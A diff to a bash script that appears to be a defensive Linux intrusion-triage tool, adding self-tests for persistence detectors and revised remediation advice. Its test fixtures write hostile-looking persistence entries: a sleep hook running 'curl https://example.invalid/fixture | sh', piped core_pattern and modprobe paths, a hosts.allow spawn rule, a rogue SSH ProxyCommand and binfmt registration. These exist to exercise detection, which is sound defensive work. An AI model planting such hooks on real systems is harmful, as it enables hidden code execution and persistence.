+    # A shared library legitimately has PT_DYNAMIC and no PT_INTERP; only an
+    # ET_EXEC may be judged on that, or every .so on the host is a finding.
+    result=$({ printf '@F /usr/lib/libfixture.so\n'; elf_fixture 200 20 5; } |
+        awk "$ELF_PROG" | awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert elf-library-not-flagged "$result" ''
+    result=$(printf '@TRUNC 4 9\n' | awk "$ELF_PROG" | awk -F '\t' '$1=="SKIP"{print $2}')
+    selftest_assert elf-truncation-reported "$result" ELF000
+    result=$({ printf '@F /tmp/notelf\n'; printf '104 101 108 108 111\n'; } |
+        awk "$ELF_PROG" | awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert elf-non-elf-ignored "$result" ''
+
+    # --- package ownership (prov_absorb) -----------------------------------
+    # Ownership is recorded only from a positive answer, so a manager that
+    # says nothing about a path yields "unowned", never "owned".
+    EXE_PKG=(); EXE_UNOWNED=(); UNOWNED_HINT=()
+    # Redirect, never a pipe: a pipeline runs prov_absorb in a subshell and
+    # its maps die with it. col_prov feeds it the same way for that reason.
+    prov_absorb dpkg /usr/bin/ls /tmp/implant \
+        < <(printf 'coreutils: /usr/bin/ls\ndiversion by dash from: /bin/sh\n')
+    selftest_assert dpkg-owned "${EXE_PKG["/usr/bin/ls"]:-absent}" coreutils
+    selftest_assert dpkg-unowned "${EXE_UNOWNED["/tmp/implant"]:-0}" 1
+    selftest_assert dpkg-diversion-not-owned "${EXE_PKG["/bin/sh"]:-absent}" absent
+    EXE_PKG=(); EXE_UNOWNED=(); UNOWNED_HINT=()
+    prov_absorb rpm /usr/bin/ls /tmp/implant \
+        < <(printf 'coreutils-9.1-1.x86_64\nfile /tmp/implant is not owned by any package\n')
+    selftest_assert rpm-owned "${EXE_PKG["/usr/bin/ls"]:-absent}" owned
+    selftest_assert rpm-unowned "${EXE_UNOWNED["/tmp/implant"]:-0}" 1
+    EXE_PKG=(); EXE_UNOWNED=(); UNOWNED_HINT=()
+    prov_absorb dpkg /usr/bin/ls < /dev/null
+    selftest_assert silent-manager-is-unowned "${EXE_UNOWNED["/usr/bin/ls"]:-0}" 1
+
+    # --- classifiers -------------------------------------------------------
+    is_private_ip 8.8.8.8       && result=priv || result=public
+    selftest_assert public-peer "$result" public
+    is_private_ip 172.16.0.1    && result=priv || result=public
+    selftest_assert rfc1918-172 "$result" priv
+    is_private_ip 172.32.0.1    && result=priv || result=public
+    selftest_assert rfc1918-172-upper-bound "$result" public
+    is_private_ip 100.64.0.1    && result=priv || result=public
+    selftest_assert cgnat-peer "$result" priv
+    is_transient_path /usr/sbin/sshd && result=transient || result=stable
+    selftest_assert stable-path "$result" stable
+    is_transient_path /dev/shm/.x    && result=transient || result=stable
+    selftest_assert transient-path "$result" transient
+    # A home directory must NOT weigh the same as /dev/shm, or every developer
+    # workstation reports its language-manager installs as CRIT listeners.
+    is_transient_path /home/u/.local/bin/app && result=transient || result=stable
+    selftest_assert home-is-not-transient "$result" stable
+    is_user_path /home/u/.local/bin/app      && result=user || result=other
+    selftest_assert home-is-user-path "$result" user
+    is_user_path /opt/vendor/bin/app         && result=user || result=other
+    selftest_assert opt-is-not-user-path "$result" other
+    # A dot-directory outside a home is still hiding.
+    is_transient_path /usr/lib/.x/payload    && result=transient || result=stable
+    selftest_assert hidden-system-dir "$result" transient
     printf 'Unit tests: %d failures\n' "$TEST_FAILURES"
     (( TEST_FAILURES == 0 )) || return 4
 )
@@ -2051,12 +3482,103 @@ selftest_sandbox() (
             *) selftest_assert "$id" no yes ;;
         esac
     done
+    # binfmt_misc: a registration is a procfs write, so the clean case must be
+    # "mounted and benign", not "absent".
+    mkdir -p "$ROOT/proc/sys/fs/binfmt_misc" "$ROOT/etc/binfmt.d"
+    printf 'enabled\ninterpreter /usr/bin/qemu-arm-static\nflags: OCF\noffset 0\nmagic 7f454c46\n' \
+        > "$ROOT/proc/sys/fs/binfmt_misc/qemu-arm"
+    result=$(run_check chk_binfmt | awk -F '\t' '$1=="FIND" && $3!="INFO"{print $2}')
+    selftest_assert clean-binfmt "$result" ''
+    printf 'enabled\ninterpreter /dev/shm/.fixture\nflags: OC\noffset 0\nmagic 7f454c46\n' \
+        > "$ROOT/proc/sys/fs/binfmt_misc/fixture"
+    printf ':evilfmt:M::MZ::/tmp/fixture-interp:\n' > "$ROOT/etc/binfmt.d/fixture.conf"
+    result=$(run_check chk_binfmt | awk -F '\t' '$1=="FIND"{print $2}')
+    for id in BFM001 BFM005; do
+        case $'\n'"$result"$'\n' in
+            *$'\n'"$id"$'\n'*) selftest_assert "$id" yes yes ;;
+            *) selftest_assert "$id" no yes ;;
+        esac
+    done
+    rm -rf -- "$ROOT/proc/sys" "$ROOT/etc/binfmt.d"
+
+    # --- kernel-mediated execution, auto-run hooks, wrappers, client SSH ---
+    mkdir -p "$ROOT/proc/sys/kernel" "$ROOT/sys/kernel" "$ROOT/etc/sysctl.d"
+    printf 'core\n'          > "$ROOT/proc/sys/kernel/core_pattern"
+    printf '/sbin/modprobe\n' > "$ROOT/proc/sys/kernel/modprobe"
+    printf '\n'              > "$ROOT/sys/kernel/uevent_helper"
+    result=$(run_check chk_kernel_exec | awk -F '\t' '$1=="FIND" && $3!="INFO"{print $2}')
+    selftest_assert clean-kernel-exec "$result" ''
+    printf '|/dev/shm/.fixture %%p\n' > "$ROOT/proc/sys/kernel/core_pattern"
+    printf '/tmp/fixture-modprobe\n'  > "$ROOT/proc/sys/kernel/modprobe"
+    printf '/tmp/fixture-uevent\n'    > "$ROOT/sys/kernel/uevent_helper"
+    printf 'kernel.core_pattern=|/tmp/fixture-sysctl\n' > "$ROOT/etc/sysctl.d/99-fixture.conf"
+    result=$(run_check chk_kernel_exec | awk -F '\t' '$1=="FIND"{print $2}')
+    for id in KEX002 KEX003 KEX004 KEX006; do
+        case $'\n'"$result"$'\n' in
+            *$'\n'"$id"$'\n'*) selftest_assert "$id" yes yes ;;
+            *) selftest_assert "$id" no yes ;;
+        esac
+    done
+    # A distribution crash handler is a pipe too, and must NOT be a finding.
+    printf '|/usr/lib/systemd/systemd-coredump %%P\n' > "$ROOT/proc/sys/kernel/core_pattern"
+    rm -f "$ROOT/etc/sysctl.d/99-fixture.conf"
+    result=$(run_check chk_kernel_exec | awk -F '\t' '$1=="FIND" && $2=="KEX002"{print $2}')
+    selftest_assert coredump-handler-not-flagged "$result" ''
+
+    mkdir -p "$ROOT/etc/network/if-up.d" "$ROOT/etc/systemd/system-sleep"
+    printf '#!/bin/sh\nexit 0\n' > "$ROOT/etc/network/if-up.d/clean"
+    CAP_STAT=1   # exercise the ownership/permission branch, not just the command rules
+    # The sandbox's hook directories really are owned by the test user, so
+    # AUT003 firing is the correct answer here; what "clean" means for this
+    # fixture is that no COMMAND rule fired.
+    result=$({ run_check chk_autorun_dirs; } | awk "$RULES_PROG" | awk -F '\t' '$1=="FIND" && $2 ~ /^PER/{print $2}')
+    selftest_assert clean-autorun-commands "$result" ''
+    result=$({ run_check chk_autorun_dirs; } | awk -F '\t' '$1=="FIND" && $2=="AUT003"{print $2; exit}')
+    selftest_assert AUT003 "$result" AUT003
+    printf '#!/bin/sh\ncurl https://example.invalid/fixture | sh\n' > "$ROOT/etc/systemd/system-sleep/fixture"
+    result=$({ run_check chk_autorun_dirs; } | awk "$RULES_PROG" | awk -F '\t' '$1=="FIND" && $2 ~ /^PER/{print $2}')
+    selftest_assert autorun-command-scored "$result" PER003
+
+    result=$(run_check chk_tcpwrappers | awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert clean-tcpwrappers "$result" ''
+    printf 'ALL: ALL: spawn (/tmp/fixture &)\n' > "$ROOT/etc/hosts.allow"
+    result=$(run_check chk_tcpwrappers | awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert TCW001 "$result" TCW001
+
+    mkdir -p "$ROOT/etc/ssh"
+    printf 'Host *\n    ServerAliveInterval 60\n' > "$ROOT/etc/ssh/ssh_config"
+    result=$(run_check chk_ssh_client | awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert clean-ssh-client "$result" ''
+    printf 'Host *\n    ProxyCommand /tmp/fixture %%h\n' > "$ROOT/etc/ssh/ssh_config"
+    result=$(run_check chk_ssh_client | awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert SSC001 "$result" SSC001
+
+    mkdir -p "$ROOT/sys/fs/bpf" "$ROOT/sys/kernel/tracing"
+    result=$(run_check chk_ebpf | awk -F '\t' '$1=="FIND" && $3!="INFO"{print $2}')
+    selftest_assert clean-ebpf "$result" ''
+    : > "$ROOT/sys/fs/bpf/fixture_pin"
+    printf 'p:probe1 do_sys_open\n' > "$ROOT/sys/kernel/tracing/kprobe_events"
+    result=$(run_check chk_ebpf | awk -F '\t' '$1=="FIND"{print $2}' | sort -u | tr '\n' ' ')
+    selftest_assert ebpf-pin-and-probe "$result" 'BPF001 BPF002 '
+
+    mkdir -p "$ROOT/usr/bin"
+    printf 'keeper\n' > "$ROOT/usr/bin/.keep"
+    result=$(run_check chk_hidden_system | awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert packaging-keeper-not-flagged "$result" ''
+    printf 'fixture only\n' > "$ROOT/usr/bin/.sshd"
+    result=$(run_check chk_hidden_system | awk -F '\t' '$1=="FIND"{print $2" "$3}')
+    selftest_assert HID002 "$result" 'HID002 HIGH'
+
+    rm -rf -- "$ROOT/proc/sys" "$ROOT/sys" "$ROOT/etc/network" "$ROOT/etc/hosts.allow" \
+              "$ROOT/etc/systemd/system-sleep" "$ROOT/etc/ssh" "$ROOT/usr" "$ROOT/etc/sysctl.d"
+
     mkdir -p "$ROOT/proc/net"
     printf 'sl local_address rem_address st tx_queue rx tr tm retr uid timeout inode\n 0: 0100007F:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 123 1\n' > "$ROOT/proc/net/tcp"
     LISTEN_ROWS=(); col_net >/dev/null
     selftest_assert proc-listener "${LISTEN_ROWS[0]:-missing}" 'tcp|127.0.0.1|22|0|123'
-    printf 'Sandbox tests: %d failures; coverage: accounts, keys, preload, cron, systemd.\n' "$TEST_FAILURES"
+    printf 'Sandbox tests: %d failures; coverage: accounts, keys, preload, cron, systemd, binfmt_misc, kernel exec handlers, auto-run hooks, TCP wrappers, SSH client, eBPF, hidden system files.\n' "$TEST_FAILURES"
     printf 'Environment-gated: live hidden PID/socket/module attacks, ftrace, immutable enforcement, firewall/MAC and package verification; not simulated here.\n'
+    printf 'Also environment-gated: package-ownership provenance (needs a real dpkg/rpm database) and the listener/outbound scores built on it; ELF_PROG is covered by --selftest unit instead.\n'
     (( TEST_FAILURES == 0 )) || return 4
 )
 
@@ -2859,7 +4381,7 @@ write_ir() {
         printf 'Host: %s. Collection UTC: %s.\n\n' "$HOST_ID" "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
         printf 'This is a triage report, not attribution. Confirm each event against independent evidence.\n'
         printf 'Artifact hashes and collection truncation are recorded in manifest.tsv.\n\n'
-        ir_section "$dir" 'Processes they ran' 'PROC AUTH_EVENT'
+        ir_section "$dir" 'Processes they ran' 'PROC AUTH_EVENT PROVENANCE'
         ir_section "$dir" 'IP addresses of intruders' 'CONNECTION LISTEN AUTH_EVENT'
         ir_section "$dir" 'User accounts they used' 'USER SSHKEY SHADOW_META SUDOERS AUTH_EVENT'
         ir_section "$dir" 'Active sessions hijacked' 'SESSION SESSION_SOCKET'
@@ -2916,6 +4438,12 @@ read -r -d '' REMEDIATE_PROG <<'AWKEOF' || true
             if (id ~ /^VNC/) return "vnc"
             if (id ~ /^SMB/) return "smb"
             if (id ~ /^NFS/) return "nfs"
+            # distcc, VNC and Modbus findings are raised by SRV* ids, which no
+            # prefix rule matched - so their remediation used to read "not tied
+            # to a listening service" for three services that are exactly that.
+            if (fix == "review_distcc") return "distcc"
+            if (fix == "review_vnc") return "vnc"
+            if (fix == "preserve_ics") return "modbus"
             return ""
         }
         $1 == "OBS" && $2 == "LISTEN" {
@@ -2935,7 +4463,9 @@ read -r -d '' REMEDIATE_PROG <<'AWKEOF' || true
                 print "\n# " B_id[i] " " B_sev[i] ": " B_title[i]
                 print "# Target: " B_target[i]
                 svc = svc_for(B_id[i], fix)
-                if (svc == "")
+                if (fix == "review_unknown_service")
+                    print "# COULD DISRUPT THE LISTENER NAMED ABOVE - this finding IS a live service. Identify its dependants before acting."
+                else if (svc == "")
                     print "# Service impact: not tied to a listening service; review local dependencies."
                 else if (svc in LIVE)
                     print "# COULD DISRUPT " toupper(svc) " - observed listening on port " LIVE[svc] ". Verify before changing."
@@ -2946,6 +4476,10 @@ read -r -d '' REMEDIATE_PROG <<'AWKEOF' || true
                 else if (fix=="capture_memory") print "# Preserve VM snapshot/memory using trusted external tooling; do not reboot yet."
                 else if (fix ~ /ssh|authkey/) print "# Preserve a working console session, review the exact key/directive, then validate sshd configuration before reload."
                 else if (fix=="inspect_webshell") print "# Preserve file and hash; compare with trusted application source before quarantining."
+                else if (fix=="review_unknown_service") print "# Capture memory and copy the binary before stopping anything; a score is a reason to investigate, not a verdict."
+                else if (fix=="inspect_binary") print "# Copy the binary out and analyse the COPY (readelf, upx -d). Do not unpack, chmod or delete in place - the original is evidence."
+                else if (fix=="review_binfmt") print "# A registration changes how every matching file executes host-wide. Confirm nothing legitimate depends on it, then disable by writing -1 to the registration."
+                else if (fix=="verify_agent") print "# Do NOT remove this agent. Reinstall from the vendor package and treat its telemetry as unreliable until the binary matches the package."
                 else print "# Compare with a trusted baseline; apply the smallest reviewed change."
             }
         }
@@ -3071,7 +4605,7 @@ selftest_lint() (
     local failures=0 source=${BASH_SOURCE[0]}
     bash -n "$source" || failures=$((failures+1))
     # Check only actual awk program contents; names in prose are harmless.
-    printf '%s\n' "$RULES_PROG" "$RENDER_PROG" "$CONFIG_RULES" "$WEBSHELL_PROG" "$SNAPSHOT_PROG" "$DIFF_PROG" "$JSON_PROG" |
+    printf '%s\n' "$RULES_PROG" "$RENDER_PROG" "$CONFIG_RULES" "$WEBSHELL_PROG" "$SNAPSHOT_PROG" "$DIFF_PROG" "$JSON_PROG" "$ELF_PROG" |
         awk '/(^|[^[:alnum:]_])(gensub|strtonum|asort|asorti)[ \t]*\(|ENDFILE|BEGINFILE/ {bad=1} END{exit bad}' || failures=$((failures+1))
     LC_ALL=C awk '/[^\t\r\040-\176]/ {print "Non-ASCII source line " NR; bad=1} END {exit bad}' "$source" || failures=$((failures+1))
     printf 'Lint: %d failures; shellcheck and distro integration are separate checks.\n' "$failures"
@@ -3116,6 +4650,12 @@ chk_artifacts() {
         finding ART001 HIGH rootkit possible "Known rootkit artifact path exists" "$path" "literal path match; verify ownership and provenance" inspect_file
         n=$((n+1))
     done <<< "$SIG_RK_PATH"
+    while IFS= read -r path; do
+        [[ -n $path ]] || continue
+        [[ -e $ROOT$path ]] || continue
+        finding ART004 HIGH malware possible "Known commodity implant or coinminer artifact path exists" "$path" "literal path match; shallow IOC list, absence proves nothing" inspect_file
+        n=$((n+1))
+    done <<< "$SIG_MALWARE_PATH"
     for f in "$ROOT"/etc/systemd/system-generators/* "$ROOT"/usr/local/lib/systemd/system-generators/* \
              "$ROOT"/etc/systemd/user-generators/* "$ROOT"/etc/NetworkManager/dispatcher.d/*; do
         [[ -f $f ]] || continue
